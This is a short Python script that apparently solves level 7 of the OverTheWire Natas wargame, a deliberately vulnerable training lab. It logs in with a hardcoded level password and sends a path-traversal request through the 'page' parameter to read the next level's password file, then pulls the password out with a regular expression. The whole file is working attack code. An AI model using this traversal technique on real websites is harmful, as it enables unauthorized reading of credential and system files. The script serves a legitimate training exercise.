import requests
import re

usrname = 'natas7'
passwd = '7z3hEENjQtflzgnT29q7wAvMNfZdh0i9'

url = "http://%s.natas.labs.overthewire.org/index.php?page=../../../../etc/natas_webpass/natas8" % usrname

session = requests.Session()

response = session.get(url, auth = (usrname, passwd))
#response = session.post(url, data = {}, auth = (usrname, passwd))
content = response.text

#print(content)

print re.findall('<br>\n(.*)\n\n<!--' , content)[0]
